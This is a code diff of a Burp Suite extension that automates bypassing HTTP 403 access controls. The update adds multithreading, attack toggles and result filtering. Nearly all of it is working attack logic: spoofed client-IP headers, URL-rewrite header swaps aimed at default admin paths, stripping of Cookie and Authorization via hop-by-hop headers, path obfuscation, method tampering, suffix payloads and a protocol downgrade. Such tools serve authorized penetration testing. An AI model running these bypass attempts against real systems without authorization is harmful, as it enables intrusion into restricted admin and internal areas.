@@ -17,6 +17,7 @@ import burp.api.montoya.ui.editor.HttpResponseEditor;
 import javax.swing.*;
 import javax.swing.border.TitledBorder;
 import javax.swing.table.AbstractTableModel;
+import javax.swing.table.DefaultTableCellRenderer;
 import java.awt.*;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
@@ -34,7 +35,8 @@ public class ForbiddenBuster implements BurpExtension, ContextMenuItemsProvider 
     private MontoyaApi api;
     private Preferences preferences;
     private final BypassTableModel tableModel = new BypassTableModel();
-    private final ExecutorService executor = Executors.newFixedThreadPool(15);
+    // Main executor for launching attacks (fire and forget)
+    private final ExecutorService mainExecutor = Executors.newCachedThreadPool();
 
     // UI Components
     private HttpRequestEditor requestViewer;
@@ -43,11 +45,20 @@ public class ForbiddenBuster implements BurpExtension, ContextMenuItemsProvider 
     private JTextArea pathConfigArea;
     private JSlider rateLimitSlider;
     private JLabel rateLimitLabel;
+    
+    // New UI Components
+    private JCheckBox chkHeaders;
+    private JCheckBox chkPathObf;
+    private JCheckBox chkMethods;
+    private JCheckBox chkSuffixes;
+    private JCheckBox chkHide404;
+    private JSpinner threadSpinner;
 
     // Defaults
     private static final String DEFAULT_IPS = "127.0.0.1\nlocalhost\n0.0.0.0\n192.168.0.1\n10.0.0.1\n::1\n127.0.0.2";
     private static final String DEFAULT_PATHS = "/admin\n/dashboard\n/login\n/panel\n/console\n/manager\n/administrator\n/private\n/internal\n/sysadmin\n/auth";
     private static final int DEFAULT_DELAY = 50; // ms
+    private static final int DEFAULT_THREADS = 5;
 
     // --- PAYLOAD LISTS ---
     private static final List<String> BYPASS_HEADERS = Arrays.asList(
@@ -70,13 +81,14 @@ public class ForbiddenBuster implements BurpExtension, ContextMenuItemsProvider 
     public void initialize(MontoyaApi api) {
         this.api = api;
         this.preferences = api.persistence().preferences();
-        api.extension().setName("403 Forbidden Buster (Gold v5.1)");
+        api.extension().setName("403 Forbidden Buster (Platinum v6.1)");
 
         SwingUtilities.invokeLater(() -> {
             // --- TAB 1: MONITOR ---
             JTable table = new JTable(tableModel);
             table.setFont(new Font("SansSerif", Font.PLAIN, 12));
             table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
+            table.setDefaultRenderer(Object.class, new StatusColorRenderer()); // Custom Renderer
 
             UserInterface ui = api.userInterface();
             requestViewer = ui.createHttpRequestEditor(EditorOptions.READ_ONLY);
@@ -86,7 +98,9 @@ public class ForbiddenBuster implements BurpExtension, ContextMenuItemsProvider 
                 if (!e.getValueIsAdjusting()) {
                     int selectedRow = table.getSelectedRow();
                     if (selectedRow != -1) {
-                        BypassResult result = tableModel.getResult(selectedRow);
+                        // Convert view index to model index in case of sorting (if added later)
+                        int modelRow = table.convertRowIndexToModel(selectedRow);
+                        BypassResult result = tableModel.getResult(modelRow);
                         requestViewer.setRequest(result.requestResponse.request());
                         responseViewer.setResponse(result.requestResponse.response());
                     } else {
@@ -102,7 +116,7 @@ public class ForbiddenBuster implements BurpExtension, ContextMenuItemsProvider 
             JMenuItem clearItem = new JMenuItem("Clear History");
             deleteItem.addActionListener(e -> {
                 int selectedRow = table.getSelectedRow();
-                if (selectedRow != -1) tableModel.removeRow(selectedRow);
+                if (selectedRow != -1) tableModel.removeRow(table.convertRowIndexToModel(selectedRow));
             });
             clearItem.addActionListener(e -> tableModel.clear());
             popupMenu.add(deleteItem);
@@ -139,7 +153,7 @@ public class ForbiddenBuster implements BurpExtension, ContextMenuItemsProvider 
             String savedIps = preferences.getString("ips");
             ipConfigArea = new JTextArea(savedIps != null ? savedIps : DEFAULT_IPS);
             ipPanel.add(new JScrollPane(ipConfigArea), BorderLayout.CENTER);
-            ipPanel.setPreferredSize(new Dimension(800, 200));
+            ipPanel.setPreferredSize(new Dimension(800, 150));
 
             // 2. Path Config Area
             JPanel pathPanel = new JPanel(new BorderLayout());
@@ -147,44 +161,60 @@ public class ForbiddenBuster implements BurpExtension, ContextMenuItemsProvider 
             String savedPaths = preferences.getString("paths");
             pathConfigArea = new JTextArea(savedPaths != null ? savedPaths : DEFAULT_PATHS);
             pathPanel.add(new JScrollPane(pathConfigArea), BorderLayout.CENTER);
-            pathPanel.setPreferredSize(new Dimension(800, 200));
+            pathPanel.setPreferredSize(new Dimension(800, 150));
 
-            // 3. Rate Limit / Settings Area
-            JPanel settingsPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
+            // 3. Settings Area
+            JPanel settingsPanel = new JPanel(new GridBagLayout());
             settingsPanel.setBorder(new TitledBorder("Scan Settings"));
+            GridBagConstraints gbc = new GridBagConstraints();
+            gbc.anchor = GridBagConstraints.WEST;
+            gbc.insets = new Insets(5, 5, 5, 5);
 
-            // FIX: Retrieve as String and parse to int
+            // Delay
             String savedDelayStr = preferences.getString("delay");
             int initialDelay = DEFAULT_DELAY;
-            if (savedDelayStr != null) {
-                try {
-                    initialDelay = Integer.parseInt(savedDelayStr);
-                } catch (NumberFormatException e) {
-                    initialDelay = DEFAULT_DELAY;
-                }
-            }
-
-            rateLimitLabel = new JLabel("Request Delay: " + initialDelay + " ms");
+            try { initialDelay = Integer.parseInt(savedDelayStr); } catch (Exception ignored) {}
+            
+            rateLimitLabel = new JLabel("Request Delay (ms): " + initialDelay);
             rateLimitSlider = new JSlider(0, 1000, initialDelay);
-            rateLimitSlider.setMajorTickSpacing(100);
-            rateLimitSlider.setPaintTicks(true);
-            rateLimitSlider.addChangeListener(e -> {
-                int val = rateLimitSlider.getValue();
-                rateLimitLabel.setText("Request Delay: " + val + " ms");
-                saveSettings(); // Save on change
-            });
+            rateLimitSlider.addChangeListener(e -> rateLimitLabel.setText("Request Delay (ms): " + rateLimitSlider.getValue()));
+
+            // Thread Count
+            String savedThreads = preferences.getString("threads");
+            int initialThreads = DEFAULT_THREADS;
+            try { initialThreads = Integer.parseInt(savedThreads); } catch (Exception ignored) {}
+            threadSpinner = new JSpinner(new SpinnerNumberModel(initialThreads, 1, 50, 1));
+            JLabel threadLabel = new JLabel("Concurrency (Threads):");
+
+            // Toggles
+            chkHeaders = new JCheckBox("Enable Header Attacks", preferences.getBoolean("chkHeaders") == null || preferences.getBoolean("chkHeaders"));
+            chkPathObf = new JCheckBox("Enable Path Obfuscation", preferences.getBoolean("chkPathObf") == null || preferences.getBoolean("chkPathObf"));
+            chkMethods = new JCheckBox("Enable Method Tampering", preferences.getBoolean("chkMethods") == null || preferences.getBoolean("chkMethods"));
+            chkSuffixes = new JCheckBox("Enable Suffix Attacks", preferences.getBoolean("chkSuffixes") == null || preferences.getBoolean("chkSuffixes"));
+            chkHide404 = new JCheckBox("Hide 404 Responses", preferences.getBoolean("chkHide404") != null && preferences.getBoolean("chkHide404"));
+
+            // Layout Settings
+            gbc.gridx = 0; gbc.gridy = 0; settingsPanel.add(rateLimitLabel, gbc);
+            gbc.gridx = 1; gbc.gridy = 0; settingsPanel.add(rateLimitSlider, gbc);
+            
+            gbc.gridx = 0; gbc.gridy = 1; settingsPanel.add(threadLabel, gbc);
+            gbc.gridx = 1; gbc.gridy = 1; settingsPanel.add(threadSpinner, gbc);
+
+            gbc.gridx = 0; gbc.gridy = 2; settingsPanel.add(chkHeaders, gbc);
+            gbc.gridx = 1; gbc.gridy = 2; settingsPanel.add(chkPathObf, gbc);
+            
+            gbc.gridx = 0; gbc.gridy = 3; settingsPanel.add(chkMethods, gbc);
+            gbc.gridx = 1; gbc.gridy = 3; settingsPanel.add(chkSuffixes, gbc);
+            
+            gbc.gridx = 0; gbc.gridy = 4; settingsPanel.add(chkHide404, gbc);
 
             JButton saveButton = new JButton("Save Configuration");
             saveButton.addActionListener(e -> {
                 saveSettings();
                 JOptionPane.showMessageDialog(null, "Settings Saved!");
             });
-
-            settingsPanel.add(rateLimitLabel);
-            settingsPanel.add(rateLimitSlider);
-            settingsPanel.add(Box.createHorizontalStrut(20));
-            settingsPanel.add(saveButton);
-            settingsPanel.setMaximumSize(new Dimension(2000, 80));
+            gbc.gridx = 0; gbc.gridy = 5; gbc.gridwidth = 2; gbc.fill = GridBagConstraints.HORIZONTAL;
+            settingsPanel.add(saveButton, gbc);
 
             configPanel.add(settingsPanel);
             configPanel.add(ipPanel);
@@ -199,14 +229,19 @@ public class ForbiddenBuster implements BurpExtension, ContextMenuItemsProvider 
         });
 
         api.userInterface().registerContextMenuItemsProvider(this);
-        api.logging().logToOutput("403 Buster Gold v5.1 Loaded.");
+        api.logging().logToOutput("403 Buster Platinum v6.1 Loaded.");
     }
 
     private void saveSettings() {
         preferences.setString("ips", ipConfigArea.getText());
         preferences.setString("paths", pathConfigArea.getText());
-        // FIX: Store as String
         preferences.setString("delay", String.valueOf(rateLimitSlider.getValue()));
+        preferences.setString("threads", String.valueOf(threadSpinner.getValue()));
+        preferences.setBoolean("chkHeaders", chkHeaders.isSelected());
+        preferences.setBoolean("chkPathObf", chkPathObf.isSelected());
+        preferences.setBoolean("chkMethods", chkMethods.isSelected());
+        preferences.setBoolean("chkSuffixes", chkSuffixes.isSelected());
+        preferences.setBoolean("chkHide404", chkHide404.isSelected());
     }
 
     @Override
@@ -214,20 +249,23 @@ public class ForbiddenBuster implements BurpExtension, ContextMenuItemsProvider 
         if (event.messageEditorRequestResponse().isEmpty()) return null;
         JMenuItem bypassItem = new JMenuItem("Bypass 403 Forbidden");
         MessageEditorHttpRequestResponse editor = event.messageEditorRequestResponse().get();
-        bypassItem.addActionListener(l -> executor.submit(() -> startAttack(editor.requestResponse())));
+        bypassItem.addActionListener(l -> mainExecutor.submit(() -> startAttack(editor.requestResponse())));
         List<Component> menuList = new ArrayList<>();
         menuList.add(bypassItem);
         return menuList;
     }
 
     private void startAttack(HttpRequestResponse baseRequestResponse) {
-        // Save automatically before starting
-        saveSettings();
+        saveSettings(); // Save current state
 
         HttpRequest originalRequest = baseRequestResponse.request();
         String originalPath = originalRequest.path();
         String host = baseRequestResponse.httpService().host();
         String scheme = baseRequestResponse.httpService().secure() ? "https://" : "http://";
+        
+        // Baseline analysis
+        short baseStatus = baseRequestResponse.response().statusCode();
+        int baseLength = baseRequestResponse.response().body().length();
 
         // Read Settings
         List<String> userIPs = Arrays.stream(ipConfigArea.getText().split("\\n"))
@@ -235,115 +273,167 @@ public class ForbiddenBuster implements BurpExtension, ContextMenuItemsProvider 
         List<String> userPaths = Arrays.stream(pathConfigArea.getText().split("\\n"))
                 .map(String::trim).filter(s -> !s.isEmpty()).collect(Collectors.toList());
         int delayMs = rateLimitSlider.getValue();
+        int threadCount = (Integer) threadSpinner.getValue();
+        boolean hide404 = chkHide404.isSelected();
 
-        api.logging().logToOutput("[-] Starting Attack: " + originalPath + " (Delay: " + delayMs + "ms)");
+        api.logging().logToOutput("[-] Starting Attack: " + originalPath + " | Threads: " + threadCount);
 
-        // --- ATTACK LOGIC ---
+        ExecutorService attackExecutor = Executors.newFixedThreadPool(threadCount);
 
-        // 1. Headers + IP Spoofing
-        for (String header : BYPASS_HEADERS) {
-            for (String ip : userIPs) {
-                HttpRequest newReq = originalRequest.withHeader(HttpHeader.httpHeader(header, ip));
-                sendAndLog(newReq, "Header: " + header + " val: " + ip, baseRequestResponse, delayMs);
-            }
-            // Dictionary Path Swapping
-            if (header.contains("URL") || header.contains("Rewrite")) {
-                HttpRequest swapReq = originalRequest.withPath("/").withHeader(HttpHeader.httpHeader(header, originalPath));
-                checkPathSwap(swapReq, "Path Swap (Current): / + " + header, originalRequest.withPath("/"), delayMs);
+        try {
+            // 1. Headers + IP Spoofing
+            if (chkHeaders.isSelected()) {
+                for (String header : BYPASS_HEADERS) {
+                    for (String ip : userIPs) {
+                        attackExecutor.submit(() -> {
+                            HttpRequest newReq = originalRequest.withHeader(HttpHeader.httpHeader(header, ip));
+                            sendAndLog(newReq, "Header: " + header + " val: " + ip, baseStatus, baseLength, delayMs, hide404);
+                        });
+                    }
+                    
+                    // Dictionary Path Swapping
+                    if (header.contains("URL") || header.contains("Rewrite")) {
+                        attackExecutor.submit(() -> {
+                            HttpRequest swapReq = originalRequest.withPath("/").withHeader(HttpHeader.httpHeader(header, originalPath));
+                            sendAndLog(swapReq, "Path Swap: / + " + header, baseStatus, baseLength, delayMs, hide404);
+                        });
 
-                for (String dictPath : userPaths) {
-                    String cleanDictPath = dictPath.startsWith("/") ? dictPath : "/" + dictPath;
-                    HttpRequest dictReq = originalRequest.withPath("/").withHeader(HttpHeader.httpHeader(header, cleanDictPath));
-                    checkPathSwap(dictReq, "Dictionary Swap: " + header + " = " + cleanDictPath, originalRequest.withPath("/"), delayMs);
+                        for (String dictPath : userPaths) {
+                            attackExecutor.submit(() -> {
+                                String cleanDictPath = dictPath.startsWith("/") ? dictPath : "/" + dictPath;
+                                HttpRequest dictReq = originalRequest.withPath("/").withHeader(HttpHeader.httpHeader(header, cleanDictPath));
+                                sendAndLog(dictReq, "Dictionary Swap: " + header + " = " + cleanDictPath, baseStatus, baseLength, delayMs, hide404);
+                            });
+                        }
+                    }
+                    
+                    // Referer
+                    if (header.equalsIgnoreCase("Referer")) {
+                        List<String> refs = new ArrayList<>();
+                        refs.add(scheme + host + originalPath);
+                        for(String p : userPaths) refs.add(scheme + host + (p.startsWith("/") ? p : "/" + p));
+                        for (String refUrl : refs) {
+                            attackExecutor.submit(() -> 
+                                sendAndLog(originalRequest.withHeader(HttpHeader.httpHeader(header, refUrl)), "Referer: " + refUrl, baseStatus, baseLength, delayMs, hide404)
+                            );
+                        }
+                    }
+                }
+                
+                // Hop-By-Hop
+                List<String> hopHeaders = new ArrayList<>(BYPASS_HEADERS);
+                hopHeaders.add("Cookie"); hopHeaders.add("Authorization");
+                for (String hop : hopHeaders) {
+                    attackExecutor.submit(() -> 
+                        sendAndLog(originalRequest.withHeader(HttpHeader.httpHeader("Connection", "close, " + hop)), "Hop-By-Hop Strip: " + hop, baseStatus, baseLength, delayMs, hide404)
+                    );
                 }
             }
-            // Referer
-            if (header.equalsIgnoreCase("Referer")) {
-                List<String> refs = new ArrayList<>();
-                refs.add(scheme + host + originalPath);
-                for(String p : userPaths) refs.add(scheme + host + (p.startsWith("/") ? p : "/" + p));
 
-                for (String refUrl : refs) {
-                    sendAndLog(originalRequest.withHeader(HttpHeader.httpHeader(header, refUrl)), "Referer: " + refUrl, baseRequestResponse, delayMs);
+            // 2. Path Obfuscation
+            if (chkPathObf.isSelected()) {
+                for (String payload : PATH_OBFUSCATION) {
+                    if (payload.startsWith("/")) {
+                        attackExecutor.submit(() -> {
+                            String cleanOriginal = originalPath.startsWith("/") ? originalPath.substring(1) : originalPath;
+                            sendAndLog(originalRequest.withPath(payload + cleanOriginal), "Path Prefix: " + payload, baseStatus, baseLength, delayMs, hide404);
+                        });
+                    }
+                }
+                // Case Switching
+                String upperPath = originalPath.toUpperCase();
+                if (!upperPath.equals(originalPath)) {
+                    attackExecutor.submit(() -> 
+                        sendAndLog(originalRequest.withPath(upperPath), "Case: UPPER", baseStatus, baseLength, delayMs, hide404)
+                    );
                 }
             }
-        }
 
-        // 2. Hop-By-Hop
-        List<String> hopHeaders = new ArrayList<>(BYPASS_HEADERS);
-        hopHeaders.add("Cookie"); hopHeaders.add("Authorization");
-        for (String hop : hopHeaders) {
-            sendAndLog(originalRequest.withHeader(HttpHeader.httpHeader("Connection", "close, " + hop)), "Hop-By-Hop Strip: " + hop, baseRequestResponse, delayMs);
-        }
-
-        // 3. Path Obfuscation
-        for (String payload : PATH_OBFUSCATION) {
-            if (payload.startsWith("/")) {
-                String cleanOriginal = originalPath.startsWith("/") ? originalPath.substring(1) : originalPath;
-                sendAndLog(originalRequest.withPath(payload + cleanOriginal), "Path Prefix: " + payload, baseRequestResponse, delayMs);
+            // 3. Method Tampering
+            if (chkMethods.isSelected()) {
+                attackExecutor.submit(() -> sendAndLog(originalRequest.withMethod("POST").withBody(""), "Method: POST", baseStatus, baseLength, delayMs, hide404));
+                attackExecutor.submit(() -> sendAndLog(originalRequest.withMethod("POST").withBody("").withHeader(HttpHeader.httpHeader("Content-Length", "0")), "Method: POST + CL:0", baseStatus, baseLength, delayMs, hide404));
+                attackExecutor.submit(() -> sendAndLog(originalRequest.withMethod("TRACE"), "Method: TRACE", baseStatus, baseLength, delayMs, hide404));
+                attackExecutor.submit(() -> sendAndLog(originalRequest.withMethod("HEAD"), "Method: HEAD", baseStatus, baseLength, delayMs, hide404));
+                attackExecutor.submit(() -> sendAndLog(originalRequest.withMethod("POST").withHeader(HttpHeader.httpHeader("X-HTTP-Method-Override", "GET")), "Method Override", baseStatus, baseLength, delayMs, hide404));
+                
+                // Protocol Downgrade
+                attackExecutor.submit(() -> {
+                    try {
+                        String rawReq = originalRequest.toString();
+                        Pattern p = Pattern.compile("HTTP/\\d(\\.\\d)?");
+                        Matcher m = p.matcher(rawReq);
+                        if (m.find()) {
+                            String downgradedRaw = m.replaceFirst("HTTP/1.0");
+                            HttpRequest downgradedReq = HttpRequest.httpRequest(baseRequestResponse.httpService(), downgradedRaw);
+                            sendAndLog(downgradedReq, "Protocol: HTTP/1.0", baseStatus, baseLength, delayMs, hide404);
+                        }
+                    } catch (Exception e) {}
+                });
             }
-        }
 
-        // 4. Case Switching
-        String upperPath = originalPath.toUpperCase();
-        if (!upperPath.equals(originalPath)) {
-            sendAndLog(originalRequest.withPath(upperPath), "Case: UPPER", baseRequestResponse, delayMs);
-        }
-
-        // 5. Method Tampering
-        sendAndLog(originalRequest.withMethod("POST").withBody(""), "Method: POST", baseRequestResponse, delayMs);
-        sendAndLog(originalRequest.withMethod("TRACE"), "Method: TRACE", baseRequestResponse, delayMs);
-        sendAndLog(originalRequest.withMethod("HEAD"), "Method: HEAD", baseRequestResponse, delayMs);
-        sendAndLog(originalRequest.withMethod("POST").withHeader(HttpHeader.httpHeader("X-HTTP-Method-Override", "GET")), "Method Override", baseRequestResponse, delayMs);
-
-        // 6. Suffixes
-        for (String suffix : SUFFIX_PAYLOADS) {
-            sendAndLog(originalRequest.withPath(originalPath + suffix), "Suffix: " + suffix, baseRequestResponse, delayMs);
-        }
-
-        // 7. Protocol Downgrade
-        try {
-            String rawReq = originalRequest.toString();
-            Pattern p = Pattern.compile("HTTP/\\d(\\.\\d)?");
-            Matcher m = p.matcher(rawReq);
-            if (m.find()) {
-                String downgradedRaw = m.replaceFirst("HTTP/1.0");
-                HttpRequest downgradedReq = HttpRequest.httpRequest(baseRequestResponse.httpService(), downgradedRaw);
-                sendAndLog(downgradedReq, "Protocol: HTTP/1.0", baseRequestResponse, delayMs);
+            // 4. Suffixes
+            if (chkSuffixes.isSelected()) {
+                for (String suffix : SUFFIX_PAYLOADS) {
+                    attackExecutor.submit(() -> 
+                        sendAndLog(originalRequest.withPath(originalPath + suffix), "Suffix: " + suffix, baseStatus, baseLength, delayMs, hide404)
+                    );
+                }
             }
-        } catch (Exception e) {}
+
+        } finally {
+            attackExecutor.shutdown();
+        }
     }
 
-    private void checkPathSwap(HttpRequest attackReq, String description, HttpRequest baselineReq, int delayMs) {
-        try {
-            if (delayMs > 0) Thread.sleep(delayMs);
-            HttpRequestResponse attackResponse = api.http().sendRequest(attackReq);
-            short statusCode = attackResponse.response().statusCode();
-
-            HttpRequestResponse baselineResponse = api.http().sendRequest(baselineReq);
-            int attackLen = attackResponse.response().body().length();
-            int baselineLen = baselineResponse.response().body().length();
-
-            if (Math.abs(attackLen - baselineLen) > 100) {
-                SwingUtilities.invokeLater(() -> tableModel.addResult(new BypassResult(
-                        attackReq.method(), attackReq.url(), description, statusCode, attackLen, attackResponse
-                )));
-            }
-        } catch (Exception e) { api.logging().logToError("Error: " + e.getMessage()); }
-    }
-
-    private void sendAndLog(HttpRequest request, String description, HttpRequestResponse original, int delayMs) {
+    private void sendAndLog(HttpRequest request, String description, short baseStatus, int baseLength, int delayMs, boolean hide404) {
         try {
             if (delayMs > 0) Thread.sleep(delayMs);
             HttpRequestResponse response = api.http().sendRequest(request);
             short statusCode = response.response().statusCode();
-            int length = response.response().bodyToString().length();
+            int length = response.response().body().length();
 
-            SwingUtilities.invokeLater(() -> tableModel.addResult(new BypassResult(
-                    request.method(), request.url(), description, statusCode, length, response
-            )));
+            if (shouldLog(statusCode, length, baseStatus, baseLength, hide404)) {
+                SwingUtilities.invokeLater(() -> tableModel.addResult(new BypassResult(
+                        request.method(), request.url(), description, statusCode, length, response
+                )));
+            }
 
         } catch (Exception e) { api.logging().logToError("Error: " + e.getMessage()); }
+    }
+
+    private boolean shouldLog(short status, int length, short baseStatus, int baseLength, boolean hide404) {
+        if (hide404 && status == 404) return false;
+        if (status != baseStatus) return true; // Status changed (e.g. 403 -> 200)
+        
+        // Length difference check (allow 10% variance or fixed amount)
+        int diff = Math.abs(length - baseLength);
+        return diff > 100; // Threshold
+    }
+
+    static class StatusColorRenderer extends DefaultTableCellRenderer {
+        @Override
+        public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
+            Component c = super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
+            if (!isSelected) {
+                BypassTableModel model = (BypassTableModel) table.getModel();
+                // Map view row to model row
+                int modelRow = table.convertRowIndexToModel(row);
+                BypassResult result = model.getResult(modelRow);
+                
+                if (result.status >= 200 && result.status < 300) {
+                    c.setBackground(new Color(144, 238, 144)); // Light Green
+                } else if (result.status >= 300 && result.status < 400) {
+                    c.setBackground(new Color(255, 218, 185)); // Peach/Orange
+                } else if (result.status >= 500) {
+                    c.setBackground(new Color(255, 182, 193)); // Light Red
+                } else {
+                    c.setBackground(Color.WHITE);
+                }
+                c.setForeground(Color.BLACK);
+            }
+            return c;
+        }
     }
 
     static class BypassTableModel extends AbstractTableModel {
